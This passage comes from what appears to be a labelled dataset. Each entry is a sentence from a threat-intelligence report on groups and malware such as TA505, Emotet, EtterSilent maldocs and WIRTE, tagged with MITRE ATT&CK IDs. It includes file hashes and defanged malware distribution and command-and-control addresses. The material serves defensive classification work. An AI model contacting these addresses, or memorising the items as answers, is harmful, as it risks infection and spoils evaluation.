"TA505\u2019s modified loader means new attack campaign could be coming", "labels": ["G0092"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "After months of inactivity, hacking group TA505's Get2 Loader has sprung back into operation, possibly signaling that the group is ready for a new round of malicious activity.", "labels": ["G0092", "S0460"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "On December 14, 2020, the Get2 loader had resurfaced with new download and execute configuration parameters named \"LD\" and \"ED.", "labels": ["S0460", "T1105"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "The \"LD\" parameter reflectively loads a downloaded dynamic-link library (DLL) file into the address space of the current process and calls its entry point.", "labels": ["T1620"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "The \"ED\" parameter copies the DLL into executable memory and invokes the entry point directly.", "labels": ["T1055"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "The preexisting \"RD\" parameter that was used to inject the downloaded DLL into EXCEL.EXE can now perform injection into WINWORD.EXE as well.", "labels": ["T1055"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "The reconfigured loader is meant to allow the group to carry out its operations without drawing the attention of enterprise defenses.", "labels": ["TA0005"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "In the past, it has been used to download the SDBbot, FlawedGrace and other malware.", "labels": ["T1105"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "TA505 is a prolific Russian-speaking, financially-motivated group that is known for launching large-scale targeted attacks.", "labels": ["G0092"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "Drawing from past experiences, Intel 471 believes that new, undiscovered malware campaigns will follow with the introduction of the reconfigured Get2 Loader.", "labels": ["S0460"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "\"TA505 can be somewhat deliberate in how they operate, more so than most of the financially-motivated groups we track,\" said Intel 471 COO Jason Passwaters.", "labels": ["G0092"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "The Intel 471 adversary intelligence on major threat groups such as TA505 and our unique insight into its capabilities, intent and motivations, can be leveraged by threat intelligence teams to remain proactive and resilient against attacks as cybercriminals modify TTPs.", "labels": ["G0092"], "document": "intel471_2020-12-18_ta505-get2-loader-malware-december"}, {"sentence": "Nation-states are taking their supply-chain attack strategy from the cybercriminal underground", "labels": ["T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "While there is still much to be uncovered, the public details point to [a known Russian APT](https://www.cisa.gov/news/2021/01/05/joint-statement-federal-bureau-investigation-fbi-cybersecurity-and-infrastructure) inserting code into a third-party IT provider\u2019s services, allowing for further targeting of approximately 50 organizations.", "labels": ["T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "This type of incident, commonly referred to as a \u201csupply-chain attack,\u201d has been the cornerstone in some of the biggest security incidents of the past decade.", "labels": ["T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "There has been a rise in events the past few years where actors aligned with governments are using supply-chain attacks for nation-state-level work.", "labels": ["T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "The most well-known supply-chain attacks of the past decade are now security parables: Russian-linked criminals have attacked ATMs for years with [different types](https://www.theguardian.com/technology/2014/oct/08/cash-machine-atm-malware-tyupkin) [of malware](https://www.vice.com/en/article/538ebn/atm-hack-russia-disappearing-malware).", "labels": ["T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "An unidentified hacking group was able to [breach a casino through a fish tank](https://money.cnn.com/2017/07/19/technology/fish-tank-hack-darktrace/index.html) that was connected to the internet.", "labels": ["T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "A litany of e-commerce sites, from Ticketmaster to British Airways to OXO, had the JavaScript in [their third-party payment forms](https://www.wired.com/story/magecart-amazon-cloud-hacks/) hijacked in order to send credit card information to various criminal groups.", "labels": ["T1059", "TA0010"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "Criminals aren\u2019t only trying to go after payment information in their supply chain attacks.", "labels": ["T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "In August 2019, attackers hit a managed services provider that worked with local government agencies [in 22 Texas towns](https://www.npr.org/2019/08/20/752695554/23-texas-towns-hit-with-ransomware-attack-in-new-front-of-cyberassault), launching a ransomware attack that brought city services and financial actions to a halt.", "labels": ["T1486"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "That attack was carried out through [a version of the MSP\u2019s remote access tool](https://www.crn.com/news/channel-programs/msp-at-center-of-texas-ransomware-hit-we-take-care-of-our-customers-#:~:text=Master%20MSP%20IT%20By%20Design,ransomware%20to%20recover%20its%20systems.), which attackers got access to during a different supply chain attack in June 2019.", "labels": ["T1486", "T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "The devastating NotPetya attack was launched in part via a supply chain attack, when Ukrainian accounting software MeDoc was breached, resulting in a software update release that was laced with malware being pushed to users.", "labels": ["S0368", "T1195", "T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "The NotPetya attack was a watershed moment that has served as the blueprint for how supply chain attacks have become a well-worn tool of those conducting espionage or acting on behalf of a government.", "labels": ["S0368", "T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "The actor boasted that he obtained this access by finding it when they used a password-spraying technique against large numbers of Office 365 and Citrix account interfaces.", "labels": ["T1110"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "They also claimed to obtain access via RDP, and in web-based exploits, bypassing antivirus detection and exploiting already compromised email accounts that lack two-factor authentication.", "labels": ["T1190", "TA0005"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "Another alleged government-linked group started taking advantage of supply chain attacks even before NotPetya.", "labels": ["S0368"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "In 2017, there were several incidents targeting ATMs across South Korea, after two software vendors were compromised.", "labels": ["T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "The malware eventually allowed the perpetrators to gain access to 2,500 accounts at a major international bank, which were then used for an unspecified number of fraudulent transfers.", "labels": ["TA0009"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "Intel 471 found that actors possibly linked to North Korea found a way to manipulate the companies\u2019 antivirus update server that allowed them to upload a remote access trojan (RAT) to the compromised ATM machines.", "labels": ["T1195"], "document": "intel471_2021-01-15_solarwinds-supply-chain-attack-iran"}, {"sentence": "Emotet takedown is not like the Trickbot takedown", "labels": ["S0367", "S0266"], "document": "intel471_2021-01-27_emotet-takedown-2021"}, {"sentence": "On Wednesday, January 27, U.S. and European law enforcement agencies [announced](https://www.europol.europa.eu/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action) that they had seized control of Emotet, the notorious botnet that\u2019s been used by cybercriminals all over the world for the past decade.", "labels": ["S0367"], "document": "intel471_2021-01-27_emotet-takedown-2021"}, {"sentence": "Only time will tell if the takedown will have a long-term impact on Emotet operations.", "labels": ["S0367"], "document": "intel471_2021-01-27_emotet-takedown-2021"}, {"sentence": "Emotet itself does not appear to have any sort of recovery mechanism, but a lot of the infected machines will have other malware installed as well, such as Qbot, [Trickbot](https://intel471.com/blog/trickbot-update-november-2020-bazar-loader-microsoft/) or something else.", "labels": ["S0367", "S0266"], "document": "intel471_2021-01-27_emotet-takedown-2021"}, {"sentence": "* **Silent Night/ZLoader:** One of the most ubiquitous banking trojans currently in existence, actors are using bulletproof hosting in conjunction with ZLoader.", "labels": [], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "Intel 471 has observed a Russian-speaking actor leverage bulletproof hosting for a website that is linked in a Microsoft Excel spreadsheet sent to phishing targets.", "labels": ["T1566"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "Once visited, the website drops ZLoader on a victim\u2019s machine.", "labels": ["T1189"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "* **DanaBot**: This banking trojan is the work of a fluent Russian-speaking actor that works with several other persons to offer a malware-as-a-service (MaaS) platform.", "labels": ["TA0011"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "In 2018, the author stated on an underground forum that he relied on bulletproof hoster IronHost for the trojan\u2019s command-and-control infrastructure.", "labels": ["TA0011"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "Additionally, Intel 471 found DanaBot samples in 2019 that were hosted on infrastructure belonging to a different, well-known bulletproof hosting provider.", "labels": ["TA0011"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "* **GozNym:** Known as more of a hybrid, GozNym was two separate malicious programs modified and merged together: a malware downloader (Nymaim) and a banking trojan variant (Gozi ISFB).", "labels": [], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "The crew behind GozNym were known to leverage a very popular fast-flux hosting botnet called Avalanche until the malicious hosting service was brought down by [law enforcement](https://www.wired.com/2016/12/took-4-years-take-avalanche-huge-online-crime-ring/) in late 2016.", "labels": [], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "The GozNym cybercrime network itself would later be dismantled by international law enforcement [in late 2019](https://www.justice.gov/opa/pr/goznym-cyber-criminal-network-operating-out-europe-targeting-american-entities-dismantled).", "labels": [], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "Information Stealers", "labels": ["TA0010"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "* **AZORult:** A notorious information stealer, its main function to steal credentials from victim machines and download or execute additional payloads.", "labels": ["TA0006", "T1105"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "While it\u2019s impossible to track all deployments of AZORult, one of the most prolific BPH hosters on the internet, CCWeb, has hosted web domains that have sent users the malware.", "labels": [], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "* **VIDAR:** An information stealer which was advertised for sale on various forums in October 2018, its primary functionality is to steal form data and stored credentials from common software such as email clients, FTP clients and web browsers.", "labels": ["TA0009"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "Hosted by the developers, VIDAR has deviated from other BPH models, buying inexpensive virtual private servers (VPS) until those are shut down by abuse complaints.", "labels": [], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "It is unclear whether the VPS hosted the real VIDAR control server code or served as a proxy.", "labels": ["TA0011"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "* **Baldr:** An information stealer that had a short-but-popular run, the Russian-linked malware developer would offer discounts to those who bought his product and hosted it on BraZZZerS, a well-known BPH provider.", "labels": ["TA0010"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "Currently the most pervasive form of cybercrime, ransomware operations would not be possible without a helping hand from BPH providers.", "labels": ["T1486"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "* **DarkSide:** One of the newest ransomware gangs in the cybercriminal underground, the author relies on a ransomware-as-a-service (RaaS) model in order to make as much money as possible.", "labels": ["T1486", "T1486"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "One actor that has claimed to be the malware\u2019s operator uses a custom PowerShell script that could exfiltrate data about a compromised system and run commands from a remote command and control (C2) server.", "labels": ["T1059", "TA0011", "TA0011", "T1059"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "The website used to drop that script is hosted in an IP range that has been used by two prominent BPH providers, MoreneHost and Yalishanda.", "labels": ["T1189"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "* **NEMTY/NEFILIM:** Between March and April 2020, Intel 471 discovered that an affiliate of the NEMTY ransomware service was running a blog used to disclose victim data.", "labels": ["T1486"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "That blog was run on BraZZZerS until the operators closed down the ransomware for good.", "labels": ["T1486"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "In May, when the NEFILIM ransomware variant was used, a new blog was launched, albeit hosted by a different BPH service.", "labels": ["T1486"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "* **Maze:** Much like NEMTY/NEFILIM, operators of Maze ran a blog that publicly announced victims.", "labels": ["S0449", "S0449"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "The blog stopped operating once the Maze gang moved onto an updated version, known as Egregor.", "labels": ["S0449", "S0554"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "BPH providers also can be tied to the following: carding shops, virtual credit card skimmers, phishing sites, DDoS attacks and spam campaigns, among others.", "labels": ["T1499"], "document": "intel471_2021-02-23_bulletproof-hosting-yalishanda-ransomware-banking"}, {"sentence": "EtterSilent: the underground\u2019s new favorite maldoc builder", "labels": ["T1204"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "The latest \u201cproduct\u201d is a malicious document builder, known in the underground as \u201cEtterSilent,\u201d that Intel 471 has seen leveraged by various cybercrime groups.", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "First advertised on a well-known Russian cybercrime forum, the seller offered two types of weaponized Microsoft Office documents (maldocs) to users: one that exploits a known vulnerability in Microsoft Office ([CVE-2017-8570](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-8570)) and another that uses a malicious macro.", "labels": ["T1059", "T1203", "T1059"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "To our knowledge, the maldoc with the macro is the more popular choice, possibly due to lower pricing and higher compatibility when compared to the exploit.", "labels": ["T1059"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "The malicious document, when opened, shows a template that poses as DocuSign, the popular software that allows individuals and organizations to electronically sign documents.", "labels": ["T1204"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "The maldoc then leverages Excel 4.0 macros stored in a hidden sheet, which allow an externally-hosted payload to be downloaded, written to disk and executed using regsvr32 or rundll32.", "labels": ["T1059", "T1105", "T1218"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "EtterSilent DocuSign template from December 2020", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "EtterSilent DocuSign template from March 2021### A cybercrime extravaganza", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "Ettersilent is being used in many malware campaigns, many of which will be familiar to most cybersecurity experts.", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "It was used in a recent spam campaign to drop an updated version of Trickbot.", "labels": ["S0266", "T1566"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "The maldoc was attached in an email that pretended to be from a well-known multinational appliance manufacturer, claiming to be a payment invoice.", "labels": ["T1566"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "On March 19, 2021, EtterSilent was used as part of a Bazar loader campaign.", "labels": ["S0534"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "The maldoc downloads the Bazar payload, which in turn connects to another URL that downloads the related Bazar backdoor.", "labels": ["S0534", "S0534", "T1105"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "Three banking trojans \u2014 BokBot, Gozi ISFB and QBot \u2014have also used EtterSilent in conjunction with their schemes.", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "Intel 471 tracked a particular campaign tied to BokBot that had numerous distribution URLs embedded in the EtterSilent maldocs.", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "The usage of Yalishanda\u2019s BPH service specifically for the delivery URL is reminiscent of years worth of Hancitor campaigns observed by Intel 471.", "labels": ["S0499"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "EtterSilent\u2019s attachment to [Yalishanda](https://intel471.com/blog/top-bulletproof-hosting-providers-yalishanda-ccweb-brazzzers-2021/) is another example of that notion.", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "The widespread use of EtterSilent shows how commoditization is a big part of the cybercrime economy.", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Trickbot payload | 9118198afca6e2479fdbcca55a08a4408570d2186a7dd8f261f1821178deb595 |", "labels": ["S0266"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Trickbot distribution URL | http://costacars[.]es/ico/ortodox.php |", "labels": ["S0266"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| EtterSilent maldoc | 50fd4b2e51908a55f2c891fb3ffde2c3661e4324c1887e65fabfb1a93a41efb2 |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| EtterSilent maldoc | 2baf563da8db9e2ed765fa7697025d277d06ee53424f6513671f2f6b7441387b |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| QBot payload | 24753d9f0d691b6d582da3e301b98f75abbdb5382bb871ee00713c5029c56d44 |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Qbot distribution URL | |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| EtterSilent maldoc | 16a0c2f741a14c423b7abe293e26f711fdb984fc52064982d874bf310c520b12 |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Ursnif payload | d5b05a81f377c33a2fba292002d0474b68483225aa09c97a00336fc368383d6a |", "labels": ["S0386"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Ursnif distribution URL | |", "labels": ["S0386", "S0386"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| EtterSilent maldoc | 267a54f074b688d591d5cfb7831f1adb443ec1441076775cb158bed0d385f712 |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Bazar payload | b7ce29ffbdf00771b539b28ce01d57cd5805ca3a6ca2eb1b694eed4466912286 |", "labels": ["S0534"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Bazar distribution URL | http://itelsys[.]ma/prod/education.php |", "labels": ["S0534"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| EtterSilent maldoc | 5f8e3b19cd4d25ac396cf64f6f448d88e301cf899142bdb03a28cec42eb71389 |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Qbot payload | 6a984d3aaffeeec32f3803489c71bfd907e2fb74dbc8eeb931c084f11293e1cc |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Qbot distribution URL | http://pokojewewladyslawowie[.]pl/orlpzhiy/44270.5684626157.dat |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| EtterSilent maldoc | 3a5d67bdc42b7a9ebd1137e49a34d82c0ee99343ae32f3367137db19131c2cf4 |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Trickbot payload | aa40f9dd1212993f79cc23111de3a8dd5e529dd1a8ca5dceaa30fba53f6f96b4 |", "labels": ["S0266"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Trickbot distribution URL | http://mineiro[.]ch/casrtnoar/count.php |", "labels": ["S0266"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| EtterSilent maldoc | 9b1c03b0cca23a94f2d6988c66eb0d246ec2648623765e83dbf20548ac874837 |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| Ursnif payload | 1c65c1a53f1cf5372bb35b5af5130e966b4bb7e7941cc1460f28628249ce5189 |", "labels": ["S0386"], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "| EtterSilent maldoc | 2a3316b69ec787ca13a3e35697bcfc4a5e37a9a3080434c56fdf17e0593e0a12 |", "labels": [], "document": "intel471_2021-04-07_ettersilent-maldoc-builder-macro-trickbot"}, {"sentence": "WIRTE Group attacking the Middle East", "labels": ["G0090"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The Intelligence Development Group of [S2 Grupo](https://s2grupo.es/en/home/) has carried out an investigation on an actor from whom LAB52 has not been able to find references or similarities in open sources and who has been identified as **WIRTE**.", "labels": ["G0090"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "It is considered unsophisticated by the fact that the scripts are unobtrusive, communications go unencrypted by HTTP, they use Powershell (increasingly monitored), and so on.", "labels": ["T1071", "T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "We must be aware that once these scripts are executed, it is when the behavior analysis of many solutions will detect them, but this fact has not been studied by LAB52.", "labels": ["T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "This actor in all the artifacts analyzed shows his victims a decoy document in Arabic with different themes.", "labels": ["T1204"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The attackers used a malware made in Visual Basic Script (VBS) as a tool to control the victim.", "labels": ["T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "It is associated that these artifacts are related because they reflect similarities from a technical and temporal point of view and because of the decoy documents used, since sometimes they are identical.", "labels": ["T1204"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "One aspect observed during the investigation is that the attackers after running the VBS used it as an Empire post-exploitation framework (<https://github.com/EmpireProject/Empire>).", "labels": ["T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "A total of five scripts plus the one involved in the incident could be collected.", "labels": ["T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "Network communication occurs over HTTP to the **micorsoft[.]store** domain to TCP/2082 port.", "labels": ["T1571"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "Port 2082 is one of the ports allowed by Cloudflare for HTTP traffic.", "labels": ["T1571", "T1071"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "This function aims to download the powershell code from the command and control server and execute it:", "labels": ["T1059", "TA0011", "T1105"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "This function decodes the decoy document, write it to disk and show it to the victim.", "labels": ["T1140"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "This document is encoded in base64 and embedded in the script itself in a variable.", "labels": ["T1027"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "**The script itself does not establish persistence** in its first execution, so either the attackers deploy it later when they execute powershell or fix it by transporting this script.", "labels": ["T1059", "T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The script once copied to APPDATA will have the following name: **Update.vbs**.", "labels": ["T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "On the other hand, if the script is running from APPDATA it does not show the document and only executes the RunPld() function which is the backdoor in powershell and that has been detailed previously.", "labels": ["T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "If it is not being executed from APPDATA it shows the DOC file \u201cdecoy\u201d, it copies and executes the backdoor (script in powershell).", "labels": ["T1059", "TA0003"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "When the victim executes the VBS file, a Word document will be opened with the following content (you can see on the left in Arabic and next to it the translation made by Google Translate):", "labels": ["T1204"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The network communication in this case is also produced by HTTP to the domain **micorsoft[.]store** to the port tcp/2082.", "labels": ["T1571", "T1071"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The only thing that varies is the decoy document that we can see below:", "labels": ["T1036"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The network communication in this case is also produced by HTTP to the **micorsoft[.]store** domain to the TCP/2082 port.", "labels": ["T1571"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "In this case the script has exactly the same code as the previous two; the decoy document is identical to \u201c617bbc71e5f0a645cbb8eeb6d4a1ece96ba0860c8ab5deda6a795e6ad244607a\u201d, varying only from where it was uploaded and the dates regarding the first one.", "labels": ["T1036"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The network communication in this case is produced by HTTP to the domain **office365-update[.]co** to TCP/2082 port.", "labels": ["T1571"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The function it does is to save, in a file named sys.txt and in a path set from the script, the content of the fileContent variable that is part of a powershell script.", "labels": ["T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The function creates an SCT (scriptlet) file on disk to execute through the JScript language a powershell whose code is in the TXT file written by the writeTXT() function.", "labels": ["T1059", "T1059"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "Regsvr32.exe is used to trigger the execution:", "labels": ["T1218"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "In this case the decoy document shown to the victim is the same as that presented in \u201cb4c20b56059a6c6762b4c99d04eb9177cb0a4707c58ef575817fb8b702f162aa\u201d.", "labels": ["T1036"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "By viewing the tweet thread we can see how they indicate that in this case runs a VBScript #Houdini RAT and that the command and control server is hxxp: //149.28.14[.]103:535/ is-ready.", "labels": ["T1059", "TA0011"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "When looking for which domains have resolved to this IP address it is observed that the only one categorized as malware is related to spdns.de and searching for this domain name we come to the analysis <https://gist.github.com/JohnLaTwC/ccdcbeb85649ef9feaae045482d694b9>(from @ JohnLaTwC) that shows how this domain is configured with port 535 and with HTTP requests from RAT Houdini.", "labels": ["T1071", "T1571"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "The fact that in this case the actor uses a Houdini varies from the rest of VBS found, which based their execution on a powershell script that received commands from a remote server and executed them, but even so there are several aspects that lead us to think that it is the same actor:", "labels": ["T1059", "T1059", "TA0011"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "* \u2022 Then writeDOC has the same logic and, besides, the decoy document is also in Arabic.", "labels": ["T1036"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "In this case the decoy document is different from the previous ones, so everything presupposes that the objective is different:", "labels": ["T1036"], "document": "lab52_2019-04-02_wirte-group-attacking-the-middle"}, {"sentence": "Winnti Group: Geostrategic and TTP (Tactics, Techniques and Procedures)", "labels": ["G0044"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "Winnti Group is currently considered to be an APT group allegedly attributed to the government of China ([1]).", "labels": ["G0044"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "**Geostrategic analysis of China and Winnti Group\u2019s cyber attacks on Thailand\u2019s gaming industry:**", "labels": ["G0044"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "Supposedly, the Chinese government, with the intention of maintaining growth and control within the international \u201cgaming\u201d market, has been attributed links with the activity of the APT Winnti Group.", "labels": ["G0044"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "The ESET company has published an investigation about a Winnti Group campaign where the company \u201cThai developer Electronics Extreme\u201d was cyber-attacked and could have distributed infected versions of its product called \u201cInfestation Gameplay\u201d.", "labels": ["G0044"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "*Illustration 4 Countries most infected by the Winnti Group campaign*", "labels": ["G0044"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "The graph above shows a high percentage of cyber-attacks by the Winnti Group against companies in the gaming sector in Thailand ([1]).", "labels": ["G0044"], "document": 